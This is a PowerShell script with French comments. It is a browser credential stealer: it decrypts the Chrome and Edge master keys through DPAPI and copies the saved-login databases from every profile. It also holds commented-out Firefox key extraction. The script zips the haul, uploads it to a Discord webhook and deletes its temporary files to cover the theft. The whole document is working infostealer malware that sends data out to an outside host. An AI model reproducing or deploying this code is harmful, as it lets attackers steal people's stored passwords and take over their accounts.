
# Envoie des données à un webhook Discord
$hookurl = "$dc"
function Send-Discord {
    [CmdletBinding()]
    param(
        [parameter(Position=0, Mandatory=$False)]
        [string]$file,
        [parameter(Position=1, Mandatory=$False)]
        [string]$text
    )

    $Body = @{
        'username' = $env:username
        'content'  = $text
    }

    if (-not([string]::IsNullOrEmpty($text))) {
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json)
    }

    if (-not([string]::IsNullOrEmpty($file))) {
        curl.exe -F "file1=@$file" $hookurl
    }
}

# Création du dossier temporaire
$FolderName = "$env:USERNAME-PASSWORDS-$(Get-Date -f yyyy-MM-dd_hh-mm)"
$ZIP = "$FolderName.zip"
$DestinationPath = "$env:TEMP/$FolderName"
New-Item -Path $DestinationPath -ItemType Directory
New-Item -Path "$DestinationPath\google" -ItemType Directory
New-Item -Path "$DestinationPath\firefox" -ItemType Directory
New-Item -Path "$DestinationPath\edge" -ItemType Directory

# Récupération des mots de passe Google Chrome
Add-Type -AssemblyName System.Security
$localStatePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
$jsonData = Get-Content -Path $localStatePath -Raw | ConvertFrom-Json
$encryptedKeyBase64 = $jsonData.os_crypt.encrypted_key
$encryptedKey = [System.Convert]::FromBase64String($encryptedKeyBase64)
$encryptedKey = $encryptedKey[5..($encryptedKey.Length - 1)]
try {
    $decryptedKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
    $decryptedKeyBase64 = [Convert]::ToBase64String($decryptedKey)
}
catch {
    Write-Output "Erreur lors du déchiffrement de la clé google : $_"
}


# Récupère les informations de connexion pour le profil par défaut
Copy-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data" -Destination "$DestinationPath\google\LoginData_0"
Copy-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State" -Destination "$DestinationPath\google\LocalState"
New-Item -Path "$DestinationPath\google\decrypted_key.txt" -ItemType File -Value $decryptedKeyBase64

# Récupère les informations de connexion pour chaque profil "Profile*"
$profiles = Get-ChildItem -Path "$env:LOCALAPPDATA\Google\Chrome\User Data" -Directory | Where-Object { $_.Name -like "Profile*" }
$index = 1
foreach ($profile in $profiles) {
    $loginDataPath = Join-Path -Path $profile.FullName -ChildPath "Login Data"
    if (Test-Path $loginDataPath) {
        Copy-Item $loginDataPath -Destination "$DestinationPath\google\LoginData_$index"
        $index++
    }
}

# Récupération des mots de passe Microsoft Edge
Add-Type -AssemblyName System.Security
$localStatePath_edge = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State"
write-host $localStatePath_edge
$content = Get-Content -Path $localStatePath_edge -Raw UTF8
Write-Host "Contenu du fichier :" $content

$jsonData = Get-Content -Path $localStatePath_edge -Raw | ConvertFrom-Json
$encryptedKeyBase64 = $jsonData.os_crypt.encrypted_key
$encryptedKey = [System.Convert]::FromBase64String($encryptedKeyBase64)
$encryptedKey = $encryptedKey[5..($encryptedKey.Length - 1)]
try {
    $decryptedKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
    $decryptedKeyBase64 = [Convert]::ToBase64String($decryptedKey)
}
catch {
    Write-Output "Erreur lors du déchiffrement de la clé Edge : $_"
}


# Récupère les informations de connexion pour le profil par défaut
Copy-Item "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data" -Destination "$DestinationPath\edge\LoginData_0"
Copy-Item "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State" -Destination "$DestinationPath\edge\LocalState"
New-Item -Path "$DestinationPath\edge\decrypted_key.txt" -ItemType File -Value $decryptedKeyBase64

# Récupère les informations de connexion pour chaque profil "Profile*"
$profiles = Get-ChildItem -Path "$env:LOCALAPPDATA\Microsoft\Edge\User Data" -Directory | Where-Object { $_.Name -like "Profile*" }
$index = 1
foreach ($profile in $profiles) {
    $loginDataPath = Join-Path -Path $profile.FullName -ChildPath "Login Data"
    if (Test-Path $loginDataPath) {
        Copy-Item $loginDataPath -Destination "$DestinationPath\edge\LoginData_$index"
        $index++
    }
}



# # Fonction pour obtenir la clé maître avec DPAPI
# function Get-MasterKey {
#     param (
#         [string]$keyDbPath,
#         [int]$iteration
#     )
#     try {
#         $keyData = [System.IO.File]::ReadAllBytes($keyDbPath)
#         $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($keyData, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
#         $masterKeyBase64 = [Convert]::ToBase64String($masterKey)
#         New-Item -Path "$DestinationPath\firefo\decrypted_key.txt" -ItemType File -Value $masterKeyBase64
#     }
#     catch {
#         Write-Output "Erreur lors de la récupération de la clé firefox : $_"
#     }
# }


# # lister tous les profils firefox
# $profiles = Get-ChildItem -Path "$env:APPDATA\Mozilla\Firefox\Profiles" -Directory
# $i = 1
# foreach ($profile in $profiles) {
#     $path = "$env:APPDATA\Mozilla\Firefox\Profiles\$($profile.Name)\key4.db"
#     if (Test-Path $path) {
#         $keyDbPath = $path
#         Get-MasterKey -keyDbPath $keyDbPath -iteration $i
#         $i++
#     }
# }



# Compresse le dossier contenant les données
Compress-Archive -Path $DestinationPath -DestinationPath "$env:TEMP/$ZIP"

# Envoie le fichier ZIP
Send-Discord -file "$env:TEMP/$ZIP"

# Nettoie les fichiers temporaires
Remove-Item "$env:TEMP/$ZIP"
Remove-Item -Recurse -Force $DestinationPath
